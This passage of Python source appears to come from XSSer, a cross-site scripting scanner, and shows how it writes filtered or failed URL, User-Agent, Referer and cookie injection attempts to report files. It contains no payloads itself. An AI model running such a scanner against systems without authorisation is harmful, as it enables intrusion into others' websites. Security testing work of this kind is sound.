                    mana = mana + 50
                if self.options.script and not self.options.fuzz:
                    mana = mana + 25
                if self.options.followred and self.options.fli:
                    mana = mana + 25
                if self.options.wizard:
                    mana = mana + 25
                if self.options.dcp:
                    mana = mana + 25
                if self.options.hash:
                    mana = mana + 10
                mana = (len(self.hash_found) * mana) + mana
                # enjoy it :)
                self.report("Mana:", mana)
                self.report("")
        c = Curl()
        if not len(self.hash_found) and self.hash_notfound:
            if self.options.hash:
                if self.options.statistics:
                    self.report('='*75 + '\n')
                self.report("[Info] Target isn't replying to the input [ --hash ] sent!\n")
            else:
                if self.options.target or self.options.heuristic:
                    self.report("")
                if self.options.heuristic:
                    pass
                else:
                    if self.options.statistics:
                        self.report('='*75 + '\n')
            if self.options.fileoutput:
                fout = open("XSSreport.raw", "w") # write better than append
                fout.write("="*75)
                fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                fout.write("="*75 + "\n\n")
                for h in self.hash_notfound:
                    if h[2] == 'heuristic':
                        if not h[4]:
                            fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[3]) + "\n\n[!] Method: " + str(h[2]) + "\n\n[*] Payload: \n\n" + str(h[5]) + "\n\n[!] Status:\n\n FILTERED!\n\n")
                        else:
                            fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[3]) + " ]\n\n[!] Method: " + str(h[2]) + "\n\n[*] Payload: \n\n " + str(h[5]) + "\n\n[!] Status:\n\n FILTERED!\n\n")
                    elif h[2] == 'hashing check':
                        if not h[4]:
                            fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[3]) + "\n\n[!] Method: " + str(h[2]) + "\n\n[*] Payload: \n\n" + str(h[5]) + "\n\n[!] Status:\n\n FILTERED!\n\n")
                        else:
                            fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[3]) + " ]\n\n[!] Method: " + str(h[2]) + "\n\n[*] Payload: \n\n " + str(h[5]) + "\n\n[!] Status:\n\n FILTERED!\n\n")
                    else:
                        if h[4]:
                            if h[2] == "XSA":
                               fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: User-Agent Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Status: XSS FAILED!\n\n")
                            elif h[2] == "XSR":
                               fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: Referer Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Status: XSS FAILED!\n\n")
                            elif h[2] == "COO":
                               fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: Cookie Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Status: XSS FAILED!\n\n")
                            else:
                                fout.write("[+] Target: " + str(h[6]) + " | " + str(h[4]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + h[1] + "\n\n[!] Status: XSS FAILED!\n\n")
                        else:
                            if h[2] == "XSA":
                               fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: User-Agent Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Status: XSS FAILED!\n\n")
                            elif h[2] == "XSR":
                               fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: Referer Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Status: XSS FAILED!\n\n")
                            elif h[2] == "COO":
                               fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: Cookie Injection" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Status: XSS FAILED!\n\n")
                            else:
                                fout.write("[+] Target: " + str(h[6]) + "\n[+] Vector: [ " + str(h[2]) + " ]\n\n[!] Method: URL" + "\n[*] Hash: " + str(h[3]) + " \n\n[*] Payload: \n\n " + str(h[0]) + "\n\n[!] Vulnerable: " + h[1] + "\n\n[!] Status: XSS FAILED!\n\n")
                    fout.write("="*75 + "\n\n")
                fout.close()
        else:
            # some exits and info for some bad situations:
            if len(self.hash_found) + len(self.hash_notfound) == 0 and not Exception:
                self.report("\n[Error] XSSer cannot send any data... maybe -something- is blocking connection(s)!?\n")
            if len(self.hash_found) + len(self.hash_notfound) == 0 and self.options.crawling:
                if self.options.xsser_gtk or self.options.target:
                    self.report('='*75)
                self.report("\n[Error] Not any feedback from crawler... Aborting! :(\n")
                self.report('='*75 + '\n')

        # print results to xml file
        if self.options.filexml:
            xml_report_results = xml_reporting(self)
            try:
                xml_report_results.print_xml_results(self.options.filexml)
            except:
                return

if __name__ == "__main__":
    app = xsser()
    options = app.create_options()
    if options:
        app.set_options(options)
        app.run()
    app.land(True)
